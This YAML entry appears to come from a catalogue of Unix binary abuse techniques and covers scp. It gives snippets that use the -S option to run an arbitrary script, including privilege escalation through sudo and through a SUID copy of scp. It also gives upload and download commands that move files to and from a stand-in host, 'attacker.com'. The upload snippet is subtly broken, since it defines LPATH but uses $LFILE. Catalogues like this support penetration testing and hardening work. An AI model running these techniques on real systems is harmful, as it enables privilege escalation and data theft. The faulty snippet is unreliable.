---
functions:
  exec-non-interactive:
    - code: |
        TF=$(mktemp)
        CMD="touch /tmp/unrestricted"
        echo "$CMD" > "$TF"
        chmod +x "$TF"
        scp -S $TF x y:
  sudo-enabled:
    - code: |
        TF=$(mktemp)
        CMD="touch /tmp/unrestricted"
        echo "$CMD" > "$TF"
        chmod +x "$TF"
        sudo scp -S $TF x y:
  suid-limited:
    - code: |
        TF=$(mktemp)
        CMD="touch /tmp/unrestricted"
        echo "$CMD" > "$TF"
        chmod +x "$TF"
        ./scp -S $TF a b:
  upload:
    - description: Send local file to a SSH server.
      code: |
        RPATH=user@attacker.com:~/where_to_save
        LPATH=file_to_send
        scp $LFILE $RPATH
  download:
    - description: Fetch a remote file from a SSH server.
      code: |
        RPATH=user@attacker.com:~/file_to_get
        LFILE=where_to_save
        scp $RPATH $LFILE
---
